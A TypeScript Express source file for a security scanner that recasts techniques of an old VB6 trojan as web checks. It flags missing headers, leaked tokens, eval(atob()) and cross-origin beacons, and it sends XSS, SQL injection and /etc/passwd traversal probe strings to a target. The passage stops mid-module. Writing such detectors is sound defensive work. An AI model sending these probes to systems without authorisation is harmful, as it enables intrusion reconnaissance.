// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
// Red Team Pattern Scanner — modern web equivalents of classic Win32 RAT techniques
// Derived from technique analysis of: Keylog.bas, Password.bas, Crypt.bas, CLIENT.BAS,
// Firewall.bas, Global.bas, disablectlaltdel.bas, Monitor.bas (Twizted v1.0 trojan)

import { Router } from "express";
import { z } from "zod";

const router = Router();

// ─── Helpers ──────────────────────────────────────────────────────────────────

async function fetchTarget(url: string, opts: RequestInit = {}): Promise<{ headers: Record<string, string>; body: string; status: number; redirectUrl?: string }> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 12000);
  try {
    const r = await fetch(url, {
      signal: controller.signal,
      redirect: "follow",
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36" },
      ...opts,
    });
    clearTimeout(timer);
    const body = await r.text().catch(() => "");
    const headers: Record<string, string> = {};
    r.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
    return { headers, body, status: r.status, redirectUrl: r.url !== url ? r.url : undefined };
  } catch (err) {
    clearTimeout(timer);
    throw err;
  }
}

type Severity = "critical" | "high" | "medium" | "low" | "info";
interface Finding {
  technique: string;        // VB6 module origin
  module: string;           // scan module name
  title: string;
  description: string;
  severity: Severity;
  evidence?: string;
  recommendation: string;
}

function sev(s: Severity): number { return { critical: 4, high: 3, medium: 2, low: 1, info: 0 }[s]; }

// ─── Module 1: Keylogger Pattern Detector (from Keylog.bas) ──────────────────
// VB6 used GetAsyncKeyState + GetKeyState polling in a timer loop.
// Web equivalent: suspicious addEventListener("keydown"), clipboard API abuse,
// input event sniffing, password field access, formjacking scripts.

function scanKeyloggerPatterns(body: string, headers: Record<string, string>): Finding[] {
  const findings: Finding[] = [];
  const src = body.toLowerCase();

  // Check for keydown/keyup/keypress listeners
  const keyEventMatches = (body.match(/addeventlistener\s*\(\s*['"`](keydown|keyup|keypress|input)/gi) ?? []);
  if (keyEventMatches.length > 3) {
    findings.push({
      technique: "Keylog.bas — GetAsyncKeyState polling",
      module: "Keylogger Detection",
      title: "Excessive Key Event Listeners",
      description: `${keyEventMatches.length} key event listeners detected. Legitimate apps rarely need more than 1-2.`,
      severity: "medium",
      evidence: keyEventMatches.slice(0, 3).join(" | "),
      recommendation: "Audit all keydown/keyup handlers. Ensure none transmit keystrokes to external endpoints.",
    });
  }

  // Clipboard API (potential formjacking)
  if (src.includes("navigator.clipboard") || src.includes("clipboarddata") || src.includes("oncopy") || src.includes("onpaste")) {
    findings.push({
      technique: "Keylog.bas — clipboard sniffing",
      module: "Keylogger Detection",
      title: "Clipboard API Access Detected",
      description: "Page accesses clipboard data which can be used to steal copied passwords or tokens.",
      severity: "medium",
      evidence: "navigator.clipboard or clipboardData API usage found",
      recommendation: "Review clipboard access. Ensure Permissions-Policy disallows clipboard-read for third-party scripts.",
    });
  }

  // No CSP = scripts can exfiltrate keystrokes freely
  const csp = headers["content-security-policy"] ?? "";
  if (!csp) {
    findings.push({
      technique: "Keylog.bas — unrestricted script execution",
      module: "Keylogger Detection",
      title: "No Content-Security-Policy",
      description: "Without CSP, injected scripts can freely log keystrokes and exfiltrate to any endpoint.",
      severity: "high",
      evidence: "Content-Security-Policy header absent",
      recommendation: "Implement CSP with script-src allowing only known origins. Block unsafe-inline where possible.",
    });
  } else if (csp.includes("unsafe-inline") || csp.includes("unsafe-eval")) {
    findings.push({
      technique: "Keylog.bas — inline script injection",
      module: "Keylogger Detection",
      title: "CSP Allows Unsafe-Inline / Unsafe-Eval",
      description: "unsafe-inline/unsafe-eval in CSP defeats protection against keylogger injection via XSS.",
      severity: "medium",
      evidence: `CSP: ${csp.substring(0, 120)}`,
      recommendation: "Replace unsafe-inline with nonces or hashes. Replace unsafe-eval with safer alternatives.",
    });
  }

  // Autocomplete off on password fields (or missing)
  const passwordFieldsNoAutocomplete = (body.match(/type=['"`]password['"`][^>]*(?!autocomplete)/gi) ?? []).length;
  if (passwordFieldsNoAutocomplete > 0 && !src.includes('autocomplete="off"') && !src.includes("autocomplete='off'")) {
    findings.push({
      technique: "Keylog.bas — form field capture",
      module: "Keylogger Detection",
      title: "Password Fields Without autocomplete=off",
      description: "Password fields without autocomplete=off may be targeted by formjacking scripts.",
      severity: "low",
      evidence: `${passwordFieldsNoAutocomplete} password field(s) detected`,
      recommendation: "Add autocomplete='new-password' or 'off' to sensitive fields.",
    });
  }

  return findings;
}

// ─── Module 2: Credential Exposure Scanner (from Password.bas) ───────────────
// VB6 used WNetEnumCachedPasswords to harvest Windows cached credentials.
// Web equivalent: passwords/tokens in cookies, URLs, response bodies, localStorage writes.

function scanCredentialExposure(body: string, headers: Record<string, string>, url: string): Finding[] {
  const findings: Finding[] = [];

  // Password/token in URL query string
  const urlObj = (() => { try { return new URL(url); } catch { return null; } })();
  if (urlObj) {
    const sensitiveParams = ["password", "passwd", "pass", "token", "secret", "key", "auth", "api_key", "apikey", "access_token"];
    for (const param of sensitiveParams) {
      if (urlObj.searchParams.has(param)) {
        findings.push({
          technique: "Password.bas — credential harvesting",
          module: "Credential Exposure",
          title: `Sensitive Parameter '${param}' in URL`,
          description: "Credentials/tokens in URLs are logged by web servers, proxies, browser history, and Referer headers.",
          severity: "critical",
          evidence: `URL contains query param: ${param}`,
          recommendation: "Move all sensitive values to POST body or Authorization header. Never place secrets in URLs.",
        });
      }
    }
  }

  // Cookie security flags
  const setCookie = headers["set-cookie"] ?? "";
  if (setCookie) {
    if (!setCookie.toLowerCase().includes("httponly")) {
      findings.push({
        technique: "Password.bas — session token theft",
        module: "Credential Exposure",
        title: "Session Cookie Missing HttpOnly Flag",
        description: "Without HttpOnly, JavaScript (including injected keyloggers) can read session cookies.",
        severity: "high",
        evidence: `Set-Cookie: ${setCookie.substring(0, 100)}`,
        recommendation: "Add HttpOnly flag to all session cookies: Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict",
      });
    }
    if (!setCookie.toLowerCase().includes("secure")) {
      findings.push({
        technique: "Password.bas — credential interception",
        module: "Credential Exposure",
        title: "Session Cookie Missing Secure Flag",
        description: "Without Secure flag, cookies are sent over HTTP where they can be intercepted.",
        severity: "high",
        evidence: `Set-Cookie: ${setCookie.substring(0, 100)}`,
        recommendation: "Add Secure flag to all authentication cookies.",
      });
    }
    if (!setCookie.toLowerCase().includes("samesite")) {
      findings.push({
        technique: "Password.bas — CSRF credential abuse",
        module: "Credential Exposure",
        title: "Session Cookie Missing SameSite Attribute",
        description: "Without SameSite, cookies are sent on cross-site requests enabling CSRF attacks.",
        severity: "medium",
        evidence: `Set-Cookie: ${setCookie.substring(0, 100)}`,
        recommendation: "Add SameSite=Strict or SameSite=Lax to session cookies.",
      });
    }
  }

  // API keys/tokens hardcoded in body
  const tokenPatterns = [
    { re: /['"](sk|pk|rk)_(live|test)_[a-zA-Z0-9]{20,}['"]/g, name: "Stripe API key" },
    { re: /['"]AKIA[A-Z0-9]{16}['"]/g, name: "AWS Access Key ID" },
    { re: /['"]ghp_[a-zA-Z0-9]{36}['"]/g, name: "GitHub Personal Access Token" },
    { re: /xox[baprs]-[0-9a-zA-Z\-]{10,}/g, name: "Slack Token" },
    { re: /['"][0-9]{10}:[a-zA-Z0-9\-_]{35}['"]/g, name: "Telegram Bot Token" },
    { re: /Authorization:\s*Bearer\s+[a-zA-Z0-9\-_.]+/gi, name: "Bearer Token in response" },
    { re: /['"][a-f0-9]{32,64}['"]/g, name: "Potential API key / hash" },
  ];
  for (const { re, name } of tokenPatterns) {
    const matches = body.match(re) ?? [];
    if (matches.length > 0 && name !== "Potential API key / hash") {
      findings.push({
        technique: "Password.bas — credential harvesting",
        module: "Credential Exposure",
        title: `${name} Exposed in Response Body`,
        description: `A hardcoded ${name} was found in the page source, making it trivially stealable.`,
        severity: "critical",
        evidence: matches[0].substring(0, 60),
        recommendation: "Never include API keys in frontend code. Use server-side proxying or environment-only secrets.",
      });
    }
  }

  // Basic Auth in response
  const wwwAuth = headers["www-authenticate"] ?? "";
  if (wwwAuth.toLowerCase().includes("basic")) {
    findings.push({
      technique: "Password.bas — plaintext credential transmission",
      module: "Credential Exposure",
      title: "HTTP Basic Authentication Detected",
      description: "Basic Auth transmits credentials as base64 (not encrypted), easily decoded.",
      severity: "medium",
      evidence: `WWW-Authenticate: ${wwwAuth}`,
      recommendation: "Replace HTTP Basic Auth with token-based authentication (JWT, session cookies).",
    });
  }

  return findings;
}

// ─── Module 3: Weak Encoding / Crypto Detector (from Crypt.bas) ──────────────
// VB6 used a simple XOR-based obfuscator (the Decript() function seen throughout).
// Web equivalent: base64-only "encryption", XOR obfuscation in JS, weak TLS, missing HSTS.

function scanCryptoWeaknesses(body: string, headers: Record<string, string>): Finding[] {
  const findings: Finding[] = [];

  // HSTS check
  const hsts = headers["strict-transport-security"] ?? "";
  if (!hsts) {
    findings.push({
      technique: "Crypt.bas — plaintext communication",
      module: "Weak Crypto Detection",
      title: "HTTP Strict-Transport-Security (HSTS) Missing",
      description: "Without HSTS, attackers can downgrade HTTPS to HTTP to intercept credentials in plaintext.",
      severity: "high",
      evidence: "Strict-Transport-Security header absent",
      recommendation: "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
    });
  } else if (!hsts.includes("includeSubDomains")) {
    findings.push({
      technique: "Crypt.bas — subdomain downgrade",
      module: "Weak Crypto Detection",
      title: "HSTS Missing includeSubDomains",
      description: "Subdomains can be attacked via SSL stripping if not included in HSTS.",
      severity: "low",
      evidence: `HSTS: ${hsts}`,
      recommendation: "Add includeSubDomains to your HSTS header.",
    });
  }

  // XOR-like obfuscation in JS (crude obfuscator patterns)
  const xorPatterns = (body.match(/\^0x[0-9a-f]+|charCodeAt\(\d+\)\s*\^|String\.fromCharCode\([^)]+\^/gi) ?? []);
  if (xorPatterns.length > 5) {
    findings.push({
      technique: "Crypt.bas — XOR string obfuscation",
      module: "Weak Crypto Detection",
      title: "XOR Obfuscation Detected in JavaScript",
      description: `${xorPatterns.length} XOR operations found — may indicate obfuscated malicious code or hidden credentials.`,
      severity: "medium",
      evidence: xorPatterns.slice(0, 2).join(" | "),
      recommendation: "Review obfuscated JS. XOR obfuscation is trivially reversible and often used to hide malicious payloads.",
    });
  }

  // Inline base64 blobs (potential data exfil or embedded payloads)
  const b64Blobs = (body.match(/['"`][A-Za-z0-9+/]{80,}={0,2}['"`]/g) ?? []);
  if (b64Blobs.length > 2) {
    findings.push({
      technique: "Crypt.bas — encoded payload carrier",
      module: "Weak Crypto Detection",
      title: "Large Base64 Blobs in Source",
      description: `${b64Blobs.length} large base64 strings found. May encode embedded scripts, exfiltration payloads, or hidden data.`,
      severity: "low",
      evidence: b64Blobs[0].substring(0, 80),
      recommendation: "Audit all base64 values. Ensure none decode to executable code or sensitive data.",
    });
  }

  // MD5 usage
  if (/md5\s*\(|CryptoJS\.MD5|crypto\.createHash\(['"`]md5/i.test(body)) {
    findings.push({
      technique: "Crypt.bas — weak hash algorithm",
      module: "Weak Crypto Detection",
      title: "MD5 Hash Algorithm in Use",
      description: "MD5 is cryptographically broken. Not suitable for passwords, integrity checks, or signatures.",
      severity: "medium",
      evidence: "MD5 function call detected in source",
      recommendation: "Replace MD5 with SHA-256 or bcrypt/argon2 for passwords.",
    });
  }

  // SHA1 usage
  if (/sha1\s*\(|createHash\(['"`]sha1/i.test(body)) {
    findings.push({
      technique: "Crypt.bas — weak hash algorithm",
      module: "Weak Crypto Detection",
      title: "SHA-1 Hash Algorithm in Use",
      description: "SHA-1 is deprecated and vulnerable to collision attacks. Should not be used for security purposes.",
      severity: "medium",
      evidence: "SHA-1 function call detected",
      recommendation: "Upgrade to SHA-256 or SHA-3 for integrity verification.",
    });
  }

  return findings;
}

// ─── Module 4: C2 Beacon Pattern Detector (from CLIENT.BAS) ──────────────────
// VB6 CLIENT.BAS maintained a persistent TCP connection to a C2 server,
// sending periodic check-ins. Web equivalent: setInterval POST beacons,
// navigator.sendBeacon abuse, WebSocket to unusual origins, eval(atob(...)).

function scanC2Patterns(body: string, headers: Record<string, string>, targetUrl: string): Finding[] {
  const findings: Finding[] = [];
  const src = body.toLowerCase();

  // eval(atob(...)) — classic payload delivery
  if (/eval\s*\(\s*atob\s*\(|eval\s*\(\s*unescape\s*\(|eval\s*\(\s*decodeURI/i.test(body)) {
    findings.push({
      technique: "CLIENT.BAS — encoded payload delivery",
      module: "C2 Beacon Detection",
      title: "eval(atob()) / eval(unescape()) Detected",
      description: "Classic technique to deliver obfuscated payloads. Exact equivalent of CLIENT.BAS decoding its C2 instructions at runtime.",
      severity: "critical",
      evidence: (body.match(/eval\s*\(\s*(?:atob|unescape|decodeURI)[^)]{0,60}/i)?.[0] ?? "").substring(0, 80),
      recommendation: "Remove all eval(atob()). Use CSP to block eval. Audit all dynamically-evaluated code.",
    });
  }

  // setInterval with very short delay (beaconing pattern)
  const intervalMatches = (body.match(/setInterval\s*\([^,)]+,\s*(\d+)\s*\)/g) ?? []);
  for (const match of intervalMatches) {
    const ms = Number(match.match(/,\s*(\d+)\s*\)/)?.[1] ?? 0);
    if (ms > 0 && ms < 5000) {
      findings.push({
        technique: "CLIENT.BAS — check-in timer loop",
        module: "C2 Beacon Detection",
        title: `High-Frequency setInterval (${ms}ms)`,
        description: `setInterval at ${ms}ms mirrors the C2 polling loop in CLIENT.BAS. May be used for data exfiltration beaconing.`,
        severity: ms < 1000 ? "high" : "medium",
        evidence: match.substring(0, 80),
        recommendation: "Audit all setInterval calls. Ensure none POST data to external endpoints.",
      });
    }
  }

  // navigator.sendBeacon to cross-origin
  const beaconCalls = (body.match(/navigator\.sendBeacon\s*\(\s*['"`][^'"`]+['"`]/g) ?? []);
  for (const call of beaconCalls) {
    const beaconUrl = call.match(/['"`]([^'"`]+)['"`]/)?.[1] ?? "";
    const targetHost = (() => { try { return new URL(targetUrl).host; } catch { return ""; } })();
    const beaconHost = (() => { try { return new URL(beaconUrl, targetUrl).host; } catch { return beaconUrl; } })();
    if (targetHost && beaconHost && beaconHost !== targetHost) {
      findings.push({
        technique: "CLIENT.BAS — C2 data exfiltration",
        module: "C2 Beacon Detection",
        title: "sendBeacon to Cross-Origin Endpoint",
        description: `navigator.sendBeacon() is posting data to ${beaconHost} (different from page origin ${targetHost}). Classic data exfiltration vector.`,
        severity: "high",
        evidence: call.substring(0, 100),
        recommendation: "Review all sendBeacon destinations. Block unauthorized origins in CSP connect-src.",
      });
    }
  }

  // WebSocket to suspicious origins
  const wsMatches = (body.match(/new WebSocket\s*\(\s*['"`]wss?:\/\/([^'"` ]+)/g) ?? []);
  for (const ws of wsMatches) {
    const wsHost = ws.match(/wss?:\/\/([^'"` /]+)/)?.[1] ?? "";
    const targetHost = (() => { try { return new URL(targetUrl).host; } catch { return ""; } })();
    if (targetHost && wsHost && !wsHost.includes(targetHost.replace(/:\d+$/, ""))) {
      findings.push({
        technique: "CLIENT.BAS — persistent C2 socket",
        module: "C2 Beacon Detection",
        title: `Cross-Origin WebSocket Connection to ${wsHost}`,
        description: "WebSocket to an external host can maintain a persistent C2-like channel — exact web equivalent of CLIENT.BAS TCP socket.",
        severity: "high",
        evidence: ws.substring(0, 100),
        recommendation: "Restrict WebSocket connections in CSP connect-src. Audit all WS endpoints.",
      });
    }
  }

  // document.write with external src
  if (/document\.write\s*\([^)]*https?:\/\//i.test(body)) {
    findings.push({
      technique: "CLIENT.BAS — remote payload injection",
      module: "C2 Beacon Detection",
      title: "document.write() Loading External URL",
      description: "Dynamic script/iframe injection via document.write() with external URL — classic second-stage payload delivery.",
      severity: "high",
      evidence: (body.match(/document\.write\s*\([^)]{0,80}/i)?.[0] ?? "").substring(0, 80),
      recommendation: "Remove all document.write(). Use DOM manipulation APIs and CSP to prevent dynamic script loading.",
    });
  }

  return findings;
}

// ─── Module 5: Information Disclosure Scanner (from Global.bas) ──────────────
// VB6 Global.bas harvested: system paths, drive letters, Windows version, registry keys,
// computer name, network username. Web equivalent: server banners, stack traces,
// internal paths, directory listing, verbose error messages.

function scanInfoDisclosure(body: string, headers: Record<string, string>, status: number): Finding[] {
  const findings: Finding[] = [];

  // Server banner
  const server = headers["server"] ?? "";
  if (server && !/^(nginx|apache|caddy|cloudflare)$/i.test(server)) {
    findings.push({
      technique: "Global.bas — system fingerprinting",
      module: "Information Disclosure",
      title: `Verbose Server Banner: ${server}`,
      description: "Server header reveals software version, helping attackers target known CVEs.",
      severity: "low",
      evidence: `Server: ${server}`,
      recommendation: "Remove or anonymize Server header. Use a WAF to mask version strings.",
    });
  }

  // X-Powered-By
  const xpb = headers["x-powered-by"] ?? "";
  if (xpb) {
    findings.push({
      technique: "Global.bas — technology fingerprinting",
      module: "Information Disclosure",
      title: `Technology Exposed: X-Powered-By: ${xpb}`,
      description: "X-Powered-By reveals your backend technology stack to attackers.",
      severity: "low",
      evidence: `X-Powered-By: ${xpb}`,
      recommendation: "Remove X-Powered-By header. In Express: app.disable('x-powered-by'). In PHP: expose_php=off.",
    });
  }

  // Internal paths in body
  const pathPatterns = [
    /[A-Za-z]:\\[A-Za-z0-9\\_.]+/g,   // Windows paths
    /\/home\/[a-z]+\/[a-zA-Z0-9/_.]+/g,  // Linux home dirs
    /\/var\/www\/[a-zA-Z0-9/_.]+/g,      // web roots
    /\/app\/[a-zA-Z0-9/_.]+/g,           // containerized paths
    /at\s+[A-Za-z.]+\s*\([A-Za-z/.:0-9]+:\d+:\d+\)/g,  // stack traces
  ];
  for (const re of pathPatterns) {
    const matches = body.match(re) ?? [];
    if (matches.length > 0) {
      findings.push({
        technique: "Global.bas — directory enumeration",
        module: "Information Disclosure",
        title: "Internal File Paths Exposed",
        description: "Server leaks internal file system paths, equivalent to Global.bas drive/directory enumeration. Aids in path traversal attacks.",
        severity: "medium",
        evidence: matches[0].substring(0, 100),
        recommendation: "Disable verbose error output in production. Use a generic 500 error page.",
      });
      break;
    }
  }

  // Stack trace disclosure
  if (/Exception in thread|Traceback \(most recent|at java\.|NullPointerException|System\.Exception:|UnhandledPromiseRejection/i.test(body)) {
    findings.push({
      technique: "Global.bas — system info harvesting",
      module: "Information Disclosure",
      title: "Stack Trace Exposed in Response",
      description: "Full stack trace reveals internal code structure, function names, and file paths — full system blueprint for attackers.",
      severity: "high",
      evidence: (body.match(/(?:Exception|Traceback|NullPointer)[^\n]{0,100}/i)?.[0] ?? "").substring(0, 100),
      recommendation: "Implement centralized error handling. Never expose stack traces in production responses.",
    });
  }

  // Directory listing
  if (/Index of \//i.test(body) || (body.includes("Parent Directory") && body.includes("[DIR]"))) {
    findings.push({
      technique: "Global.bas — directory enumeration",
      module: "Information Disclosure",
      title: "Directory Listing Enabled",
      description: "Web server exposes full directory contents — equivalent to Global.bas SearchDirs() recursive file enumeration.",
      severity: "high",
      evidence: "Apache/Nginx directory listing page detected",
      recommendation: "Disable directory listing. Apache: Options -Indexes. Nginx: autoindex off.",
    });
  }

  // Debug mode
  if (/DEBUG\s*=\s*True|app\.debug\s*=\s*True|FLASK_DEBUG=1|NODE_ENV.*development/i.test(body)) {
    findings.push({
      technique: "Global.bas — system info harvesting",
      module: "Information Disclosure",
      title: "Debug Mode Enabled in Production",
      description: "Debug mode exposes source code, environment variables, and internal configuration to the browser.",
      severity: "critical",
      evidence: (body.match(/DEBUG[^\n]{0,50}/i)?.[0] ?? "").substring(0, 80),
      recommendation: "Set DEBUG=False and NODE_ENV=production before deploying. Never ship with debug mode enabled.",
    });
  }

  // Version comments
  const versionComments = (body.match(/<!--[^>]*v?\d+\.\d+[^>]*-->/g) ?? []);
  if (versionComments.length > 0) {
    findings.push({
      technique: "Global.bas — version fingerprinting",
      module: "Information Disclosure",
      title: "Version Numbers in HTML Comments",
      description: "Version numbers in comments help attackers target specific CVEs.",
      severity: "low",
      evidence: versionComments[0].substring(0, 80),
      recommendation: "Strip version comments from production builds. Use build tools to remove comments.",
    });
  }

  return findings;
}

// ─── Module 6: Clickjacking / UI Security (from disablectlaltdel.bas) ─────────
// VB6 disabled taskbar, fast task switching (SystemParametersInfo), and Ctrl+Alt+Del
// to lock users in. Web equivalent: missing clickjacking protection, UI redressing.

function scanUISecurityHeaders(headers: Record<string, string>): Finding[] {
  const findings: Finding[] = [];

  // X-Frame-Options
  const xfo = headers["x-frame-options"] ?? "";
  const csp = headers["content-security-policy"] ?? "";
  const hasFrameAncestors = csp.includes("frame-ancestors");

  if (!xfo && !hasFrameAncestors) {
    findings.push({
      technique: "disablectlaltdel.bas — UI lockdown",
      module: "UI Security / Clickjacking",
      title: "Clickjacking Protection Missing",
      description: "No X-Frame-Options or CSP frame-ancestors. Attackers can embed your app in an iframe for clickjacking attacks — trapping users like disablectlaltdel.bas locked Win32 UI.",
      severity: "high",
      evidence: "X-Frame-Options and frame-ancestors absent",
      recommendation: "Add X-Frame-Options: DENY or CSP frame-ancestors 'none' to prevent iframe embedding.",
    });
  }

  // X-Content-Type-Options
  const xcto = headers["x-content-type-options"] ?? "";
  if (!xcto) {
    findings.push({
      technique: "disablectlaltdel.bas — resource hijacking",
      module: "UI Security / Clickjacking",
      title: "X-Content-Type-Options Missing",
      description: "Without nosniff, browsers may MIME-sniff responses and execute non-script files as scripts.",
      severity: "medium",
      evidence: "X-Content-Type-Options header absent",
      recommendation: "Add X-Content-Type-Options: nosniff to all responses.",
    });
  }

  // Referrer-Policy
  const rp = headers["referrer-policy"] ?? "";
  if (!rp) {
    findings.push({
      technique: "disablectlaltdel.bas — data leakage",
      module: "UI Security / Clickjacking",
      title: "Referrer-Policy Not Set",
      description: "Without Referrer-Policy, full URLs (including tokens) may leak via the Referer header to third-party resources.",
      severity: "low",
      evidence: "Referrer-Policy header absent",
      recommendation: "Add Referrer-Policy: strict-origin-when-cross-origin",
    });
  }

  // Permissions-Policy
  const pp = headers["permissions-policy"] ?? "";
  if (!pp) {
    findings.push({
      technique: "disablectlaltdel.bas — privilege/resource lock",
      module: "UI Security / Clickjacking",
      title: "Permissions-Policy Not Set",
      description: "Without Permissions-Policy, embedded scripts can access camera, microphone, geolocation, and clipboard.",
      severity: "medium",
      evidence: "Permissions-Policy header absent",
      recommendation: "Add Permissions-Policy: camera=(), microphone=(), geolocation=(), clipboard-read=()",
    });
  }

  return findings;
}

// ─── Module 7: Tracking / Fingerprinting Detector (from Monitor.bas) ──────────
// VB6 Monitor.bas collected system metrics (CPU, RAM, screen resolution, process list).
// Web equivalent: canvas fingerprinting, navigator.* abuse, third-party analytics
// tracking SDKs, device fingerprinting libraries.

function scanTrackingPatterns(body: string): Finding[] {
  const findings: Finding[] = [];

  // Canvas fingerprinting
  if (/canvas.*getImageData|toDataURL.*canvas|createImageData/i.test(body) &&
      /Math\.random\(\)|uniqueId|fingerprint/i.test(body)) {
    findings.push({
      technique: "Monitor.bas — system monitoring",
      module: "Tracking / Fingerprinting",
      title: "Potential Canvas Fingerprinting",
      description: "Canvas API combined with randomization suggests device fingerprinting — web equivalent of Monitor.bas system metric collection.",
      severity: "medium",
      evidence: "canvas.toDataURL() with fingerprint-related code",
      recommendation: "Disclose fingerprinting to users. Consider removing if not needed for core functionality.",
    });
  }

  // navigator property enumeration
  const navAccess = (body.match(/navigator\.(userAgent|platform|hardwareConcurrency|deviceMemory|languages|plugins|connection|getBattery)/g) ?? []);
  if (navAccess.length >= 3) {
    findings.push({
      technique: "Monitor.bas — system fingerprinting",
      module: "Tracking / Fingerprinting",
      title: `Browser Fingerprinting (${navAccess.length} navigator properties accessed)`,
      description: `Accessing ${navAccess.join(", ")} — builds a unique device profile identical to Monitor.bas system enumeration.`,
      severity: "medium",
      evidence: navAccess.join(" | "),
      recommendation: "Document fingerprinting in privacy policy. Use only necessary properties for functionality.",
    });
  }

  // Third-party tracker SDKs
  const trackers = [
    { pattern: /google-analytics\.com|gtag\(|ga\('send'/i, name: "Google Analytics" },
    { pattern: /connect\.facebook\.net|fbq\(/i, name: "Facebook Pixel" },
    { pattern: /static\.hotjar\.com|hj\(/i, name: "Hotjar" },
    { pattern: /script\.crazyegg\.com/i, name: "Crazy Egg" },
    { pattern: /cdn\.segment\.com|analytics\.track\(/i, name: "Segment" },
    { pattern: /mixpanel\.com|mixpanel\.track/i, name: "Mixpanel" },
    { pattern: /logrocket\.com\/LogRocket/i, name: "LogRocket (session replay)" },
    { pattern: /fullstory\.com|window\._fs/i, name: "FullStory (session replay)" },
    { pattern: /clarity\.ms|window\.clarity/i, name: "Microsoft Clarity" },
  ];
  const foundTrackers: string[] = [];
  for (const { pattern, name } of trackers) {
    if (pattern.test(body)) foundTrackers.push(name);
  }
  if (foundTrackers.length > 0) {
    findings.push({
      technique: "Monitor.bas — remote monitoring exfil",
      module: "Tracking / Fingerprinting",
      title: `${foundTrackers.length} Third-Party Tracker(s) Detected`,
      description: `Found: ${foundTrackers.join(", ")}. These collect behavioral data sent to third-party servers — remote monitoring equivalent of Monitor.bas.`,
      severity: "info",
      evidence: foundTrackers.join(", "),
      recommendation: "Disclose all tracking in privacy policy. Implement cookie consent. Consider self-hosting analytics.",
    });
  }

  // Screen resolution / devicePixelRatio probing
  if (/screen\.(width|height|availWidth|colorDepth)|devicePixelRatio|innerWidth.*innerHeight/i.test(body)) {
    const screenProps = (body.match(/screen\.(width|height|availWidth|colorDepth)|devicePixelRatio/ig) ?? []);
    if (screenProps.length >= 2) {
      findings.push({
        technique: "Monitor.bas — display monitoring",
        module: "Tracking / Fingerprinting",
        title: "Screen Property Enumeration",
        description: `${screenProps.length} screen properties accessed — contributes to device fingerprint (Monitor.bas equivalent).`,
        severity: "low",
        evidence: screenProps.join(", "),
        recommendation: "Only access screen dimensions for layout purposes. Avoid combining with other fingerprint signals.",
      });
    }
  }

  return findings;
}

// ─── Module 8: WAF Fingerprint (from Firewall.bas) ───────────────────────────
// VB6 Firewall.bas scanned the filesystem for firewall executables.
// Web equivalent: probe for WAF signatures in headers and error responses.

async function scanWafFingerprint(url: string): Promise<Finding[]> {
  const findings: Finding[] = [];

  // Probe with a known WAF trigger payload
  const payloads = [
    `${url}?test=<script>alert(1)</script>`,
    `${url}?id=1' OR '1'='1`,
    `${url}?cmd=../../../etc/passwd`,
  ];

  const wafSignatures: Array<{ pattern: RegExp; name: string; vendor: string }> = [
    { pattern: /cloudflare/i, name: "Cloudflare WAF", vendor: "Cloudflare" },
    { pattern: /mod_security|NOYB/i, name: "ModSecurity", vendor: "SpiderLabs" },
    { pattern: /sucuri/i, name: "Sucuri WAF", vendor: "Sucuri" },
    { pattern: /akamai|AkamaiGHost/i, name: "Akamai WAF", vendor: "Akamai" },
    { pattern: /Barracuda/i, name: "Barracuda WAF", vendor: "Barracuda" },
    { pattern: /BigIP|F5/i, name: "F5 BIG-IP ASM", vendor: "F5" },
    { pattern: /Imperva|incapsula/i, name: "Imperva/Incapsula", vendor: "Imperva" },
    { pattern: /AWS WAF|awswaf/i, name: "AWS WAF", vendor: "Amazon" },
    { pattern: /Fastly/i, name: "Fastly WAF", vendor: "Fastly" },
    { pattern: /Wordfence/i, name: "Wordfence (WordPress)", vendor: "Wordfence" },
  ];

  let wafDetected: string | null = null;
  let blocked = false;

  try {
    const r = await fetchTarget(payloads[0]);
    const allText = JSON.stringify(r.headers) + r.body;

    for (const sig of wafSignatures) {
      if (sig.pattern.test(allText)) {
        wafDetected = sig.name;
        break;
      }
    }

    if (r.status === 403 || r.status === 406 || r.status === 429 || r.status === 444) {
      blocked = true;
    }
  } catch {}

  if (wafDetected) {
    findings.push({
      technique: "Firewall.bas — firewall detection",
      module: "WAF Fingerprint",
      title: `WAF Detected: ${wafDetected}`,
      description: `A ${wafDetected} WAF signature was detected. Attackers use WAF fingerprinting (like Firewall.bas) to craft bypass payloads.`,
      severity: "info",
      evidence: `WAF signature matched: ${wafDetected}`,
      recommendation: "Keep WAF rules updated. Use generic error pages that don't reveal WAF vendor. Enable bot management.",
    });
  } else if (blocked) {
    findings.push({
      technique: "Firewall.bas — firewall detection",
      module: "WAF Fingerprint",
      title: "WAF/Firewall Active (Vendor Unknown)",
      description: "Suspicious requests are blocked but WAF vendor couldn't be fingerprinted — good security posture.",
      severity: "info",
      evidence: `Blocked with HTTP ${blocked}`,
      recommendation: "Continue keeping WAF vendor information opaque. Ensure block pages don't leak internal IPs.",
    });
  } else {
    findings.push({
      technique: "Firewall.bas — no firewall found",
      module: "WAF Fingerprint",
      title: "No WAF Detected",
      description: "No WAF protection found. XSS/SQLi payloads reached the origin server unblocked.",
      severity: "high",
      evidence: "No WAF signature in responses to probe payloads",
      recommendation: "Deploy a WAF (Cloudflare, AWS WAF, ModSecurity) to filter common attack payloads before they reach your app.",
    });
  }

  return findings;
}

// ─── Module 9: Win64 Platform Analysis (WinAPI x64 — Modern Windows) ─────────
// Win32 is largely phased out. Windows 10/11 runs 64-bit (x64) natively.
// Win64 equivalents replace all legacy Win32 APIs:
//   GetVersionEx     → deprecated Win8+; replaced by RtlGetVersion / CIM Win32_OperatingSystem
//   GetSystemInfo    → replaced by [RuntimeInformation]::OSArchitecture
//   GlobalMemoryStatusEx → replaced by CIM OperatingSystem.TotalVisibleMemorySize
//   EnumServicesStatus   → replaced by NtQuerySystemInformation / Get-Service
//   NtAllocateVirtualMemory, NtCreateThreadEx, NtWriteVirtualMemory → NTAPI direct syscalls
//   WOW64: 32-bit apps redirect System32→SysWOW64 + HKLM\SOFTWARE→Wow6432Node
//   Heaven's Gate: 0x33 far call to switch from x86 (WOW64) → native x64 segment

function scanWin64Patterns(body: string, headers: Record<string, string>): Finding[] {
  const findings: Finding[] = [];

  // WOW64 filesystem path exposure (C:\Windows\SysWOW64, Program Files (x86))
  const wow64Paths = (body.match(/SysWOW64|Program Files \(x86\)|syswow64|wow64cpu|WOW64/g) ?? []);
